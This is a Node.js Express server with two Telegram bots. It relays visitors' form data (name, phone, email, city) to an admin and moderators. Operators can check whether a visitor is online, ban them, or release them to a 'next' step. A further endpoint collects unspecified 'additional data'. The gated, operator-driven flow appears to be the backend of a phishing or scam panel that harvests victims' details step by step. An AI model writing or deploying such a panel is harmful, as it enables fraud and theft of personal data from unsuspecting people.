const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

const mainBot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });

const adminId = Number(process.env.ADMIN_CHAT_ID);

// ===== БАЗЫ =====
let bannedUsers = {};
let userStatus = {};
let seenUsers = {};
let onlineUsers = {};
let requestTexts = {};
let moderators = []; // 🔥 модераторы

// ===== ВСПОМОГАТЕЛЬНОЕ =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return Date.now() - onlineUsers[id] < 20000;
}

function sendToAll(text, opts = {}) {
  // админу
  mainBot.sendMessage(adminId, text, opts).catch(()=>{});
  // модераторам
  moderators.forEach(m => {
    mainBot.sendMessage(m, text, opts).catch(()=>{});
  });
}

// ===== КОМАНДЫ (ТОЛЬКО АДМИН) =====
mainBot.onText(/\/addmod (\d+)/, (msg, match) => {
  if (msg.chat.id !== adminId) return;

  const id = Number(match[1]);
  if (!moderators.includes(id)) {
    moderators.push(id);
  }

  mainBot.sendMessage(adminId, `✅ Добавлен модератор: ${id}`);
});

mainBot.onText(/\/delmod (\d+)/, (msg, match) => {
  if (msg.chat.id !== adminId) return;

  const id = Number(match[1]);
  moderators = moderators.filter(m => m !== id);

  mainBot.sendMessage(adminId, `❌ Удалён модератор: ${id}`);
});

mainBot.onText(/\/mods/, (msg) => {
  if (msg.chat.id !== adminId) return;

  const list = moderators.length ? moderators.join("\n") : "нет";
  mainBot.sendMessage(adminId, `👥 Модераторы:\n${list}`);
});

// ===== ВХОД =====
app.post("/enter", (req, res) => {
  const id = req.body.clientId;
  if (!id) return res.json({ ok: false });

  onlineUsers[id] = Date.now();

  // отправляем админу и модерам
  const text = `👀 Вход\n🆔 ${id}`;
  enterBot.sendMessage(adminId, text).catch(()=>{});
  moderators.forEach(m => enterBot.sendMessage(m, text).catch(()=>{}));

  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ОТПРАВКА ОСНОВНОЙ ФОРМЫ =====
app.post("/send", (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  userStatus[id] = "wait";

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";

  const baseText = `${statusText}

🆔 ID: ${id}

📦 Услуга: ${d.service}
👤 Имя: ${d.name}
📞 Телефон: ${d.phone}
📧 Email: ${d.email}
🏙 Город: ${d.city}
💬 Комментарий: ${d.comment}`;

  requestTexts[id] = baseText;

  // кнопки
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
        [
          { text: "🚫 Бан", callback_data: "ban_" + id },
          { text: "✅ Разбан", callback_data: "unban_" + id }
        ],
        [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
      ]
    }
  };

  // отправляем всем
  sendToAll(baseText, opts);

  res.json({ ok: true, id });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== ДОП ДАННЫЕ =====
app.post("/send2", (req, res) => {
  const data = req.body;
  const id = data.id;

  if (!id) return res.json({ ok: false });

  const msg = `📩 ДОП ДАННЫЕ

🆔 ID: ${id}
💬 ${data.value}`;

  sendToAll(msg);

  res.json({ ok: true });
});

// ===== КНОПКИ =====
mainBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  // онлайн
  if (data.startsWith("check")) {
    const online = isOnline(id);

    const newText = `${requestTexts[id]}

Статус: ${online ? "🟢 Онлайн" : "🔴 Оффлайн"}`;

    try {
      await mainBot.editMessageText(newText, {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        reply_markup: q.message.reply_markup
      });
    } catch {}

    mainBot.answerCallbackQuery(q.id);
  }

  // бан
  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    mainBot.answerCallbackQuery(q.id, { text: "🚫 Бан" });
  }

  // разбан
  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    mainBot.answerCallbackQuery(q.id, { text: "✅ Разбан" });
  }

  // дальше
  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    mainBot.answerCallbackQuery(q.id, { text: "➡️ Дальше" });
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
